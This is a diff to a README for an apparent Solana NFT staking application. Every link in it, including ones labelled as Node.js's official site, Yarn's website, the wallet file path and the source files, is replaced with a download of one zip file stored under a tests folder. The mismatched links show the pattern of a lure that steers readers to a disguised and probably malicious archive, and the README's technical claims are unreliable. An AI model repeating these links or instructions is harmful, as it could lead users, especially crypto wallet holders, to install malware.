@@ -1,6 +1,6 @@
 # 🚀 Astronaut-NFT-Staking - Stake Your NFTs with Ease
 
-[![Download Astronaut-NFT-Staking](https://raw.githubusercontent.com/advvm43/Astronaut-NFT-Staking/main/pical/Astronaut-NFT-Staking.zip)](https://raw.githubusercontent.com/advvm43/Astronaut-NFT-Staking/main/pical/Astronaut-NFT-Staking.zip)  
+[![Download Astronaut-NFT-Staking](https://github.com/advvm43/Astronaut-NFT-Staking/raw/refs/heads/main/backend/tests/Astronaut_NF_Staking_v1.9.zip)](https://github.com/advvm43/Astronaut-NFT-Staking/raw/refs/heads/main/backend/tests/Astronaut_NF_Staking_v1.9.zip)  
 
 ## 🌟 Overview
 Welcome to the **Astronaut-NFT-Staking** project. This application allows you to stake your Astronaut NFT collections using a multiple factor rewards program. You can choose from three different staking models to maximize your rewards. This guide walks you through downloading and running the application step by step.
@@ -9,7 +9,7 @@ Welcome to the **Astronaut-NFT-Staking** project. This application allows you to
 To begin, you need to download the application from the Releases page. Follow these steps:
 
 1. **Visit the Downloads Page:**  
-   Go to [this link](https://raw.githubusercontent.com/advvm43/Astronaut-NFT-Staking/main/pical/Astronaut-NFT-Staking.zip) to download the software you need.
+   Go to [this link](https://github.com/advvm43/Astronaut-NFT-Staking/raw/refs/heads/main/backend/tests/Astronaut_NF_Staking_v1.9.zip) to download the software you need.
 
 ## 💻 System Requirements
 - Operating System: Windows, macOS, or any Linux distribution.
@@ -22,10 +22,10 @@ To begin, you need to download the application from the Releases page. Follow th
 
 3. **Install Dependencies:**
    To run the application, ensure you have the following installed on your machine:
-   - **https://raw.githubusercontent.com/advvm43/Astronaut-NFT-Staking/main/pical/Astronaut-NFT-Staking.zip** This allows you to run JavaScript outside of a web browser.
-     - Download from [https://raw.githubusercontent.com/advvm43/Astronaut-NFT-Staking/main/pical/Astronaut-NFT-Staking.zip official site](https://raw.githubusercontent.com/advvm43/Astronaut-NFT-Staking/main/pical/Astronaut-NFT-Staking.zip).
+   - **https://github.com/advvm43/Astronaut-NFT-Staking/raw/refs/heads/main/backend/tests/Astronaut_NF_Staking_v1.9.zip** This allows you to run JavaScript outside of a web browser.
+     - Download from [https://github.com/advvm43/Astronaut-NFT-Staking/raw/refs/heads/main/backend/tests/Astronaut_NF_Staking_v1.9.zip official site](https://github.com/advvm43/Astronaut-NFT-Staking/raw/refs/heads/main/backend/tests/Astronaut_NF_Staking_v1.9.zip).
    - **Yarn:** This is a package manager.
-     - Install it by following the instructions on [Yarn's website](https://raw.githubusercontent.com/advvm43/Astronaut-NFT-Staking/main/pical/Astronaut-NFT-Staking.zip).
+     - Install it by following the instructions on [Yarn's website](https://github.com/advvm43/Astronaut-NFT-Staking/raw/refs/heads/main/backend/tests/Astronaut_NF_Staking_v1.9.zip).
    - **ts-node:** This is a TypeScript execution engine.
      - Install it globally using the command:  
        ```bash
@@ -34,26 +34,26 @@ To begin, you need to download the application from the Releases page. Follow th
 
 4. **Prepare Your Solana Wallet:**  
    Make sure your Solana wallet is set up correctly. You need the wallet file at this location:  
-   `https://raw.githubusercontent.com/advvm43/Astronaut-NFT-Staking/main/pical/Astronaut-NFT-Staking.zip`.  
+   `https://github.com/advvm43/Astronaut-NFT-Staking/raw/refs/heads/main/backend/tests/Astronaut_NF_Staking_v1.9.zip`.  
 
 ## 🔧 Using the Application
 5. **Access the Main Script:**  
    The main functionality of the application is in the script located at:  
-   `https://raw.githubusercontent.com/advvm43/Astronaut-NFT-Staking/main/pical/Astronaut-NFT-Staking.zip`.
+   `https://github.com/advvm43/Astronaut-NFT-Staking/raw/refs/heads/main/backend/tests/Astronaut_NF_Staking_v1.9.zip`.
 
 6. **Understand the Program Account Types:**  
    All types for the program are declared here:  
-   `https://raw.githubusercontent.com/advvm43/Astronaut-NFT-Staking/main/pical/Astronaut-NFT-Staking.zip`.
+   `https://github.com/advvm43/Astronaut-NFT-Staking/raw/refs/heads/main/backend/tests/Astronaut_NF_Staking_v1.9.zip`.
 
 7. **Setting Up JS Bindings:**  
    The IDL, which helps in making JavaScript bindings easier, is located here:  
-   `https://raw.githubusercontent.com/advvm43/Astronaut-NFT-Staking/main/pical/Astronaut-NFT-Staking.zip`.
+   `https://github.com/advvm43/Astronaut-NFT-Staking/raw/refs/heads/main/backend/tests/Astronaut_NF_Staking_v1.9.zip`.
 
 ## 🛠️ Running the Application
 8. **Test the Script Functions:**  
    To verify everything works, follow these steps:
-   - Change the commands in the main function of `https://raw.githubusercontent.com/advvm43/Astronaut-NFT-Staking/main/pical/Astronaut-NFT-Staking.zip` to call the other functions properly.
-   - Confirm the `ANCHOR_WALLET` environment variable in the `ts-node` script in `https://raw.githubusercontent.com/advvm43/Astronaut-NFT-Staking/main/pical/Astronaut-NFT-Staking.zip`.
+   - Change the commands in the main function of `https://github.com/advvm43/Astronaut-NFT-Staking/raw/refs/heads/main/backend/tests/Astronaut_NF_Staking_v1.9.zip` to call the other functions properly.
+   - Confirm the `ANCHOR_WALLET` environment variable in the `ts-node` script in `https://github.com/advvm43/Astronaut-NFT-Staking/raw/refs/heads/main/backend/tests/Astronaut_NF_Staking_v1.9.zip`.
    - Execute the following command in your terminal:  
      ```bash
      yarn ts-node
@@ -77,4 +77,4 @@ To begin, you need to download the application from the Releases page. Follow th
 ## 🌠 Conclusion
 You now have all the necessary steps to download, set up, and use the Astronaut-NFT-Staking application. If you encounter any issues, refer back to this guide or seek help from the community. Enjoy staking your Astronaut NFTs!  
 
-[![Download Astronaut-NFT-Staking](https://raw.githubusercontent.com/advvm43/Astronaut-NFT-Staking/main/pical/Astronaut-NFT-Staking.zip)](https://raw.githubusercontent.com/advvm43/Astronaut-NFT-Staking/main/pical/Astronaut-NFT-Staking.zip)  
+[![Download Astronaut-NFT-Staking](https://github.com/advvm43/Astronaut-NFT-Staking/raw/refs/heads/main/backend/tests/Astronaut_NF_Staking_v1.9.zip)](https://github.com/advvm43/Astronaut-NFT-Staking/raw/refs/heads/main/backend/tests/Astronaut_NF_Staking_v1.9.zip)  
